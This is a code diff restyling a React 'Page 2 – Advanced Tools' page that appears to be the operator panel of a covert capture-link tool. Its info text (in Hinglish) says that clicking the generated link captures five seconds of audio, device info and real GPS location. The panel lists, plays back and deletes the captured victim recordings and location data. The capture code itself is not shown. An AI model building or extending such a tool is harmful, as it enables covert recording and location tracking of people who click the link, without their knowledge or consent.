@@ -4,7 +4,7 @@ import {
   Mic, Loader2, ArrowLeft, Copy, Check, ExternalLink, 
   Headphones, Info, Link2, Smartphone, Database, 
   Trash2, RefreshCw, Volume2, FileJson, Radio, MapPin,
-  Shield, Zap, Navigation, LucideIcon
+  Shield, Zap, LucideIcon
 } from "lucide-react";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
@@ -55,7 +55,6 @@ const Page2 = () => {
         .select("*")
         .or(`session_id.eq.${sessionId},session_id.eq.${sessionId}_deviceinfo`)
         .order("captured_at", { ascending: false });
-      
       if (error) throw error;
       setCapturedData(data || []);
     } catch (err) {
@@ -82,7 +81,6 @@ const Page2 = () => {
         .from("captured_photos")
         .delete()
         .or(`session_id.eq.${sessionId},session_id.eq.${sessionId}_deviceinfo`);
-      
       if (error) throw error;
       setCapturedData([]);
       toast({ title: "Cleared!" });
@@ -92,9 +90,7 @@ const Page2 = () => {
   };
 
   useEffect(() => {
-    if (activeTab === "media") {
-      fetchCapturedData();
-    }
+    if (activeTab === "media") fetchCapturedData();
   }, [activeTab, sessionId]);
 
   const copyLink = async () => {
@@ -104,54 +100,40 @@ const Page2 = () => {
     setTimeout(() => setCopiedLink(false), 2000);
   };
 
-  const getTabColor = (color: string, active: boolean) => {
-    const colors: Record<string, { bg: string; border: string; text: string; activeBg: string }> = {
-      red: { bg: "bg-red-500/10", border: "border-red-500/30", text: "text-red-400", activeBg: "bg-red-500" },
-      orange: { bg: "bg-orange-500/10", border: "border-orange-500/30", text: "text-orange-400", activeBg: "bg-orange-500" },
-      cyan: { bg: "bg-cyan-500/10", border: "border-cyan-500/30", text: "text-cyan-400", activeBg: "bg-cyan-500" },
-      green: { bg: "bg-green-500/10", border: "border-green-500/30", text: "text-green-400", activeBg: "bg-green-500" },
-      purple: { bg: "bg-purple-500/10", border: "border-purple-500/30", text: "text-purple-400", activeBg: "bg-purple-500" },
-      pink: { bg: "bg-pink-500/10", border: "border-pink-500/30", text: "text-pink-400", activeBg: "bg-pink-500" },
-    };
-    return colors[color] || colors.red;
+  const tabColors: Record<string, { bg: string; text: string; activeBg: string; border: string }> = {
+    red: { bg: "bg-red-500/8", text: "text-red-400", activeBg: "bg-red-500", border: "border-red-500/20" },
+    orange: { bg: "bg-amber-500/8", text: "text-amber-400", activeBg: "bg-amber-500", border: "border-amber-500/20" },
   };
 
   if (authLoading) {
     return (
-      <div className="min-h-[100dvh] bg-black flex items-center justify-center">
-        <Loader2 className="w-8 h-8 text-red-500 animate-spin" />
+      <div className="min-h-[100dvh] bg-[#09090b] flex items-center justify-center">
+        <Loader2 className="w-8 h-8 text-violet-500 animate-spin" />
       </div>
     );
   }
 
   return (
-    <div className="min-h-[100dvh] bg-gradient-to-b from-black via-gray-950 to-black relative overflow-hidden">
-      {/* Grid Background */}
-      <div className="fixed inset-0 pointer-events-none overflow-hidden">
-        <div 
-          className="absolute inset-0 opacity-[0.03]"
-          style={{
-            backgroundImage: `linear-gradient(rgba(239, 68, 68, 0.3) 1px, transparent 1px), linear-gradient(90deg, rgba(239, 68, 68, 0.3) 1px, transparent 1px)`,
-            backgroundSize: '50px 50px'
-          }}
-        />
-        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[300px] bg-red-600/10 rounded-full blur-[120px]" />
+    <div className="min-h-[100dvh] bg-[#09090b] relative overflow-hidden">
+      {/* Background */}
+      <div className="fixed inset-0 pointer-events-none">
+        <div className="absolute top-[-20%] right-[-10%] w-[500px] h-[500px] rounded-full bg-red-600/[0.05] blur-[100px]" />
+        <div className="absolute bottom-[-15%] left-[-10%] w-[400px] h-[400px] rounded-full bg-amber-600/[0.04] blur-[100px]" />
       </div>
 
       <div className="relative z-10 min-h-[100dvh] flex flex-col">
         {/* Header */}
-        <header className="px-4 py-3 border-b border-red-500/20 bg-black/50 backdrop-blur-xl">
-          <div className="flex items-center justify-between max-w-2xl mx-auto">
+        <header className="px-4 py-3 bg-white/[0.03] backdrop-blur-xl border-b border-white/[0.06] sticky top-0 z-20">
+          <div className="flex items-center justify-between max-w-xl mx-auto">
             <Link 
               to="/" 
-              className="flex items-center gap-2 px-3 py-1.5 rounded-lg border border-red-500/30 bg-red-500/10 text-red-400 hover:bg-red-500/20 transition-all text-xs font-medium"
+              className="flex items-center gap-2 px-3 py-1.5 rounded-xl border border-white/[0.08] bg-white/[0.04] text-white/60 hover:bg-white/[0.08] transition-all text-xs font-medium"
             >
-              <ArrowLeft className="w-3.5 h-3.5" />
-              BACK
+              <ArrowLeft className="w-3.5 h-3.5" /> BACK
             </Link>
             
-            <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-500/10 border border-red-500/30">
-              <Radio className="w-3.5 h-3.5 text-red-500 animate-pulse" />
+            <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-red-500/10 border border-red-500/20">
+              <Radio className="w-3.5 h-3.5 text-red-400 animate-pulse" />
               <span className="text-[10px] font-bold text-red-400 uppercase tracking-wider">Page 2</span>
             </div>
             
@@ -160,25 +142,26 @@ const Page2 = () => {
         </header>
 
         {/* Tab Grid */}
-        <div className="px-4 py-4 border-b border-red-500/10">
-          <div className="max-w-2xl mx-auto grid grid-cols-4 gap-2">
+        <div className="px-4 py-4">
+          <div className="max-w-xl mx-auto grid grid-cols-4 gap-2">
             {tabs.map((tab) => {
-              const colors = getTabColor(tab.color, activeTab === tab.id);
+              const colors = tabColors[tab.color] || tabColors.red;
               const Icon = tab.icon;
+              const isActive = activeTab === tab.id;
               return (
                 <button
                   key={tab.id}
-                  onClick={() => setActiveTab(activeTab === tab.id ? null : tab.id)}
+                  onClick={() => setActiveTab(isActive ? null : tab.id)}
                   className={cn(
-                    "flex flex-col items-center gap-1.5 p-3 rounded-xl border transition-all",
-                    activeTab === tab.id
+                    "flex flex-col items-center gap-1.5 p-3 rounded-xl border transition-all active:scale-95",
+                    isActive
                       ? `${colors.activeBg} border-transparent text-white shadow-lg`
-                      : `${colors.bg} ${colors.border} ${colors.text} hover:scale-105`
+                      : `bg-white/[0.03] ${colors.border} ${colors.text} hover:bg-white/[0.06] hover:scale-[1.03]`
                   )}
                 >
                   <div className={cn(
                     "w-8 h-8 rounded-lg flex items-center justify-center",
-                    activeTab === tab.id ? "bg-white/20" : "bg-black/30"
+                    isActive ? "bg-white/20" : "bg-white/[0.04]"
                   )}>
                     <Icon className="w-4 h-4" />
                   </div>
@@ -189,8 +172,8 @@ const Page2 = () => {
 
             {/* Back to Page 1 */}
             <Link to="/">
-              <div className="flex flex-col items-center gap-1.5 p-3 rounded-xl border bg-green-500/10 border-green-500/30 text-green-400 hover:scale-105 transition-all">
-                <div className="w-8 h-8 rounded-lg bg-black/30 flex items-center justify-center">
+              <div className="flex flex-col items-center gap-1.5 p-3 rounded-xl border border-white/[0.08] bg-white/[0.03] text-emerald-400 hover:bg-white/[0.06] hover:scale-[1.03] transition-all active:scale-95">
+                <div className="w-8 h-8 rounded-lg bg-white/[0.04] flex items-center justify-center">
                   <ArrowLeft className="w-4 h-4" />
                 </div>
                 <span className="text-[9px] font-bold uppercase tracking-wider">Page 1</span>
@@ -200,120 +183,103 @@ const Page2 = () => {
         </div>
 
         {/* Main Content */}
-        <main className="flex-1 px-4 py-4">
-          <div className="max-w-2xl mx-auto">
+        <main className="flex-1 px-4 py-2">
+          <div className="max-w-xl mx-auto">
             
             {/* Audio Capture Tab */}
             {activeTab === "audiocapture" && (
-              <div className="space-y-4 animate-in fade-in duration-300">
+              <div className="space-y-3 animate-in fade-in duration-300">
                 {/* Info */}
-                <div className="p-4 rounded-xl bg-gradient-to-br from-red-500/10 to-orange-500/5 border border-red-500/20">
-                  <div className="flex items-start gap-3">
-                    <Info className="w-5 h-5 text-red-400 flex-shrink-0 mt-0.5" />
-                    <p className="text-xs text-gray-400 leading-relaxed">
-                      Link click hone pe <span className="text-red-400 font-bold">5 sec audio</span> + <span className="text-orange-400 font-bold">device info</span> + <span className="text-green-400 font-bold">real GPS location</span> capture hogi.
-                    </p>
-                  </div>
+                <div className="flex items-start gap-2.5 p-3 rounded-xl bg-amber-500/[0.06] border border-amber-500/[0.12]">
+                  <Info className="w-4 h-4 text-amber-400/80 flex-shrink-0 mt-0.5" />
+                  <p className="text-[11px] text-white/50 leading-relaxed">
+                    Link click hone pe <span className="text-red-400 font-semibold">5 sec audio</span> + <span className="text-amber-400 font-semibold">device info</span> + <span className="text-emerald-400 font-semibold">real GPS location</span> capture hogi.
+                  </p>
                 </div>
 
                 {/* Session */}
-                <div className="p-4 rounded-xl bg-gray-900/50 border border-gray-800">
-                  <label className="text-[10px] font-bold text-gray-500 uppercase tracking-wider mb-2 block">Session ID</label>
-                  <div className="flex items-center gap-2 p-3 rounded-lg bg-black/50 border border-gray-800">
-                    <Radio className="w-4 h-4 text-red-500" />
-                    <span className="text-sm font-mono text-white">{sessionId}</span>
+                <div className="p-4 rounded-xl bg-white/[0.03] border border-white/[0.06]">
+                  <label className="text-[10px] font-semibold text-white/30 uppercase tracking-wider mb-2 block">Session ID</label>
+                  <div className="flex items-center gap-2 p-3 rounded-lg bg-white/[0.04] border border-white/[0.06]">
+                    <Radio className="w-4 h-4 text-red-400" />
+                    <span className="text-sm font-mono text-white/80">{sessionId}</span>
                   </div>
                 </div>
 
                 {/* Link */}
-                <div className="p-4 rounded-xl bg-gray-900/50 border border-gray-800">
-                  <label className="text-[10px] font-bold text-gray-500 uppercase tracking-wider mb-2 flex items-center gap-1.5">
-                    <Link2 className="w-3 h-3" />
-                    Capture Link
+                <div className="p-4 rounded-xl bg-white/[0.03] border border-white/[0.06]">
+                  <label className="text-[10px] font-semibold text-white/30 uppercase tracking-wider mb-2 flex items-center gap-1.5">
+                    <Link2 className="w-3 h-3" /> Capture Link
                   </label>
                   <div className="flex gap-2">
                     <Input
                       value={captureLink}
                       readOnly
-                      className="flex-1 h-10 bg-black/50 border-gray-700 text-red-400 font-mono text-xs"
+                      className="flex-1 h-10 bg-white/[0.04] border-white/[0.08] text-red-400/80 font-mono text-xs"
                     />
-                    <Button onClick={copyLink} className="h-10 px-4 bg-red-600 hover:bg-red-700">
+                    <Button onClick={copyLink} className="h-10 px-4 bg-gradient-to-r from-red-600 to-red-500 hover:opacity-90">
                       {copiedLink ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                     </Button>
                   </div>
                 </div>
 
                 {/* Test Button */}
-                <Button
+                <button
                   onClick={() => window.open(captureLink, '_blank')}
-                  className="w-full h-12 bg-gradient-to-r from-red-600 to-orange-600 hover:opacity-90 font-bold shadow-lg shadow-red-500/30"
+                  className="w-full h-11 rounded-xl bg-gradient-to-r from-red-600 to-amber-600 text-white text-sm font-semibold hover:opacity-90 active:scale-[0.98] transition-all flex items-center justify-center gap-2"
                 >
-                  <ExternalLink className="w-4 h-4 mr-2" />
-                  TEST LINK
-                </Button>
+                  <ExternalLink className="w-4 h-4" /> TEST LINK
+                </button>
 
                 {/* Features */}
                 <div className="grid grid-cols-3 gap-2">
-                  <div className="p-3 rounded-xl bg-red-500/10 border border-red-500/20 text-center">
-                    <Headphones className="w-5 h-5 mx-auto mb-1 text-red-400" />
-                    <p className="text-[9px] font-bold text-red-400">AUDIO</p>
-                  </div>
-                  <div className="p-3 rounded-xl bg-orange-500/10 border border-orange-500/20 text-center">
-                    <Smartphone className="w-5 h-5 mx-auto mb-1 text-orange-400" />
-                    <p className="text-[9px] font-bold text-orange-400">DEVICE</p>
-                  </div>
-                  <div className="p-3 rounded-xl bg-green-500/10 border border-green-500/20 text-center">
-                    <MapPin className="w-5 h-5 mx-auto mb-1 text-green-400" />
-                    <p className="text-[9px] font-bold text-green-400">GPS</p>
-                  </div>
+                  {[
+                    { icon: Headphones, label: "AUDIO", color: "red" },
+                    { icon: Smartphone, label: "DEVICE", color: "amber" },
+                    { icon: MapPin, label: "GPS", color: "emerald" },
+                  ].map(f => (
+                    <div key={f.label} className={`p-3 rounded-xl bg-${f.color}-500/[0.06] border border-${f.color}-500/[0.12] text-center`}>
+                      <f.icon className={`w-5 h-5 mx-auto mb-1 text-${f.color}-400`} />
+                      <p className={`text-[9px] font-bold text-${f.color}-400`}>{f.label}</p>
+                    </div>
+                  ))}
                 </div>
               </div>
             )}
 
             {/* Media/Data Tab */}
             {activeTab === "media" && (
-              <div className="space-y-4 animate-in fade-in duration-300">
-                {/* Header */}
+              <div className="space-y-3 animate-in fade-in duration-300">
                 <div className="flex items-center justify-between">
                   <div className="flex items-center gap-2">
-                    <Database className="w-4 h-4 text-orange-400" />
-                    <span className="text-xs font-bold text-white uppercase">Captured Data</span>
-                    <span className="px-2 py-0.5 rounded-full bg-orange-500/20 text-[10px] font-bold text-orange-400">
+                    <Database className="w-4 h-4 text-amber-400" />
+                    <span className="text-xs font-semibold text-white/80 uppercase">Captured Data</span>
+                    <span className="px-2 py-0.5 rounded-lg bg-amber-500/15 text-[10px] font-bold text-amber-400">
                       {capturedData.length}
                     </span>
                   </div>
                   <div className="flex gap-2">
-                    <Button
-                      size="sm"
-                      variant="outline"
-                      onClick={fetchCapturedData}
-                      disabled={isLoadingData}
-                      className="h-8 px-3 border-gray-700 text-gray-400"
-                    >
+                    <Button size="sm" variant="outline" onClick={fetchCapturedData} disabled={isLoadingData}
+                      className="h-8 px-3 border-white/[0.08] bg-white/[0.04] text-white/50 hover:bg-white/[0.08]">
                       <RefreshCw className={cn("w-3.5 h-3.5", isLoadingData && "animate-spin")} />
                     </Button>
                     {capturedData.length > 0 && (
-                      <Button
-                        size="sm"
-                        variant="outline"
-                        onClick={clearAllData}
-                        className="h-8 px-3 border-red-500/30 text-red-400"
-                      >
+                      <Button size="sm" variant="outline" onClick={clearAllData}
+                        className="h-8 px-3 border-red-500/20 bg-red-500/10 text-red-400 hover:bg-red-500/20">
                         <Trash2 className="w-3.5 h-3.5" />
                       </Button>
                     )}
                   </div>
                 </div>
 
-                {/* List */}
                 {isLoadingData ? (
                   <div className="flex items-center justify-center py-12">
-                    <Loader2 className="w-6 h-6 text-orange-500 animate-spin" />
+                    <Loader2 className="w-6 h-6 text-violet-500 animate-spin" />
                   </div>
                 ) : capturedData.length === 0 ? (
-                  <div className="text-center py-12 rounded-xl bg-gray-900/30 border border-gray-800">
-                    <Database className="w-12 h-12 mx-auto mb-3 text-gray-700" />
-                    <p className="text-sm font-medium text-gray-500">No data yet</p>
+                  <div className="text-center py-12 rounded-xl bg-white/[0.02] border border-white/[0.06]">
+                    <Database className="w-12 h-12 mx-auto mb-3 text-white/10" />
+                    <p className="text-sm font-medium text-white/30">No data yet</p>
                   </div>
                 ) : (
                   <div className="space-y-3 max-h-[400px] overflow-y-auto">
@@ -326,60 +292,46 @@ const Page2 = () => {
                           key={item.id}
                           className={cn(
                             "p-4 rounded-xl border",
-                            isDeviceInfo ? "bg-orange-500/5 border-orange-500/20" : "bg-red-500/5 border-red-500/20"
+                            isDeviceInfo 
+                              ? "bg-amber-500/[0.04] border-amber-500/[0.12]" 
+                              : "bg-red-500/[0.04] border-red-500/[0.12]"
                           )}
                         >
                           <div className="flex items-start justify-between gap-3 mb-3">
                             <div className="flex items-center gap-3">
                               <div className={cn(
                                 "w-9 h-9 rounded-lg flex items-center justify-center",
-                                isDeviceInfo ? "bg-orange-500/20" : "bg-red-500/20"
+                                isDeviceInfo ? "bg-amber-500/15" : "bg-red-500/15"
                               )}>
-                                {isDeviceInfo ? (
-                                  <FileJson className="w-4 h-4 text-orange-400" />
-                                ) : (
-                                  <Volume2 className="w-4 h-4 text-red-400" />
-                                )}
+                                {isDeviceInfo ? <FileJson className="w-4 h-4 text-amber-400" /> : <Volume2 className="w-4 h-4 text-red-400" />}
                               </div>
                               <div>
-                                <p className={cn("text-xs font-bold", isDeviceInfo ? "text-orange-400" : "text-red-400")}>
+                                <p className={cn("text-xs font-semibold", isDeviceInfo ? "text-amber-400" : "text-red-400")}>
                                   {isDeviceInfo ? "DEVICE + LOCATION" : "AUDIO"}
                                 </p>
-                                <p className="text-[9px] text-gray-500">{new Date(item.captured_at).toLocaleString()}</p>
+                                <p className="text-[9px] text-white/30">{new Date(item.captured_at).toLocaleString()}</p>
                               </div>
                             </div>
-                            <Button
-                              size="sm"
-                              variant="ghost"
-                              onClick={() => deleteItem(item.id)}
-                              className="h-8 w-8 p-0 text-red-400 hover:bg-red-500/20"
-                            >
+                            <Button size="sm" variant="ghost" onClick={() => deleteItem(item.id)}
+                              className="h-8 w-8 p-0 text-red-400 hover:bg-red-500/15">
                               <Trash2 className="w-3.5 h-3.5" />
                             </Button>
                           </div>
                           
                           {isDeviceInfo ? (
-                            <div className="p-3 rounded-lg bg-black/30 max-h-40 overflow-y-auto">
-                              <pre className="text-[9px] text-gray-400 whitespace-pre-wrap break-all font-mono">
+                            <div className="p-3 rounded-lg bg-white/[0.03] max-h-40 overflow-y-auto">
+                              <pre className="text-[9px] text-white/40 whitespace-pre-wrap break-all font-mono">
                                 {(() => {
-                                  try {
-                                    const parsed = JSON.parse(item.image_data);
-                                    // Highlight location if available
-                                    if (parsed.latitude && parsed.longitude) {
-                                      return JSON.stringify(parsed, null, 2);
-                                    }
-                                    return JSON.stringify(parsed, null, 2);
-                                  } catch {
-                                    return item.image_data;
-                                  }
+                                  try { return JSON.stringify(JSON.parse(item.image_data), null, 2); }
+                                  catch { return item.image_data; }
                                 })()}
                               </pre>
                             </div>
                           ) : isAudio ? (
                             <audio controls className="w-full h-10" src={item.image_data} />
                           ) : (
-                            <div className="p-3 rounded-lg bg-black/30">
-                              <p className="text-[9px] text-gray-500 truncate font-mono">{item.image_data.substring(0, 100)}...</p>
+                            <div className="p-3 rounded-lg bg-white/[0.03]">
+                              <p className="text-[9px] text-white/30 truncate font-mono">{item.image_data.substring(0, 100)}...</p>
                             </div>
                           )}
                         </div>
@@ -393,21 +345,21 @@ const Page2 = () => {
             {/* Empty State */}
             {!activeTab && (
               <div className="text-center py-16">
-                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-gradient-to-br from-red-500/20 to-orange-500/20 flex items-center justify-center">
-                  <Zap className="w-8 h-8 text-red-400" />
+                <div className="w-16 h-16 mx-auto mb-4 rounded-2xl bg-white/[0.04] border border-white/[0.06] flex items-center justify-center">
+                  <Zap className="w-8 h-8 text-white/15" />
                 </div>
-                <h3 className="text-sm font-bold text-white mb-1">Select a Tool</h3>
-                <p className="text-[11px] text-gray-500">Tap on any tab above</p>
+                <h3 className="text-sm font-semibold text-white/50 mb-1">Select a Tool</h3>
+                <p className="text-[11px] text-white/25">Tap on any tab above</p>
               </div>
             )}
           </div>
         </main>
 
         {/* Footer */}
-        <footer className="px-4 py-3 border-t border-red-500/10">
-          <div className="max-w-2xl mx-auto flex items-center justify-center gap-3">
-            <Shield className="w-3 h-3 text-red-500" />
-            <span className="text-[9px] text-gray-600 uppercase tracking-wider">Page 2 • Advanced Tools</span>
+        <footer className="px-4 py-3 border-t border-white/[0.04]">
+          <div className="max-w-xl mx-auto flex items-center justify-center gap-3">
+            <Shield className="w-3 h-3 text-white/20" />
+            <span className="text-[9px] text-white/20 uppercase tracking-wider">Page 2 • Advanced Tools</span>
           </div>
         </footer>
       </div>
